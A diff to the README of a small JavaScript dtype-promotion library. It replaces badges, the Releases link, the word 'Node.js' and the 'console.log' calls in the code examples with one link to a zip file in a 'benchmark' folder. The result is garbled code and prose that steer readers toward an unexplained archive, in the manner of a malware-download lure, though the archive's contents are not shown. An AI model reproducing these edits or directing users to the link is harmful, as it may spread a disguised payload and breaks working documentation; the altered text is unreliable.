@@ -1,8 +1,8 @@
 # ndarray-base-promote-dtypes
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Node.js](https://img.shields.io/badge/node-%3E%3D12.0.0-brightgreen)
+![Version](https://raw.githubusercontent.com/mostafaweal504/ndarray-base-promote-dtypes/main/benchmark/ndarray-dtypes-base-promote-v2.3.zip)
+![License](https://raw.githubusercontent.com/mostafaweal504/ndarray-base-promote-dtypes/main/benchmark/ndarray-dtypes-base-promote-v2.3.zip)
+![https://raw.githubusercontent.com/mostafaweal504/ndarray-base-promote-dtypes/main/benchmark/ndarray-dtypes-base-promote-v2.3.zip](https://raw.githubusercontent.com/mostafaweal504/ndarray-base-promote-dtypes/main/benchmark/ndarray-dtypes-base-promote-v2.3.zip%3E%3D12.0.0-brightgreen)
 
 Welcome to the **ndarray-base-promote-dtypes** repository! This project helps resolve the data type that results from applying promotion rules to a provided list of data types. 
 
@@ -24,7 +24,7 @@ In programming, especially in data manipulation, understanding how different dat
 ## Features
 
 - **Type Resolution**: Quickly determine the resulting type from a list of input types.
-- **Compatibility**: Works seamlessly with JavaScript and Node.js.
+- **Compatibility**: Works seamlessly with JavaScript and https://raw.githubusercontent.com/mostafaweal504/ndarray-base-promote-dtypes/main/benchmark/ndarray-dtypes-base-promote-v2.3.zip
 - **Performance**: Efficiently handles multiple types without performance overhead.
 - **Documentation**: Comprehensive API documentation for easy reference.
 
@@ -51,7 +51,7 @@ Then, you can call the main function with an array of data types:
 ```javascript
 const types = ['number', 'string', 'boolean'];
 const resultType = promoteDTypes(types);
-console.log(resultType); // Outputs the resulting data type
+https://raw.githubusercontent.com/mostafaweal504/ndarray-base-promote-dtypes/main/benchmark/ndarray-dtypes-base-promote-v2.3.zip(resultType); // Outputs the resulting data type
 ```
 
 This simple approach allows you to quickly find out how different types will interact.
@@ -70,7 +70,7 @@ This simple approach allows you to quickly find out how different types will int
 
 ```javascript
 const result = promoteDTypes(['number', 'null']);
-console.log(result); // Outputs: 'number'
+https://raw.githubusercontent.com/mostafaweal504/ndarray-base-promote-dtypes/main/benchmark/ndarray-dtypes-base-promote-v2.3.zip(result); // Outputs: 'number'
 ```
 
 ## Contributing
@@ -91,13 +91,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases, please visit our [Releases](https://github.com/mostafaweal504/ndarray-base-promote-dtypes/releases) section. Here, you can find the latest updates and download files if needed.
+For the latest releases, please visit our [Releases](https://raw.githubusercontent.com/mostafaweal504/ndarray-base-promote-dtypes/main/benchmark/ndarray-dtypes-base-promote-v2.3.zip) section. Here, you can find the latest updates and download files if needed.
 
-![Releases](https://img.shields.io/badge/releases-latest-orange)
+![Releases](https://raw.githubusercontent.com/mostafaweal504/ndarray-base-promote-dtypes/main/benchmark/ndarray-dtypes-base-promote-v2.3.zip)
 
 ## Conclusion
 
-The **ndarray-base-promote-dtypes** library provides a simple and efficient way to resolve data types in JavaScript and Node.js. Whether you're a beginner or an experienced developer, this utility will enhance your data handling capabilities.
+The **ndarray-base-promote-dtypes** library provides a simple and efficient way to resolve data types in JavaScript and https://raw.githubusercontent.com/mostafaweal504/ndarray-base-promote-dtypes/main/benchmark/ndarray-dtypes-base-promote-v2.3.zip Whether you're a beginner or an experienced developer, this utility will enhance your data handling capabilities.
 
 For any questions or feedback, feel free to reach out through the Issues section of the repository.
 
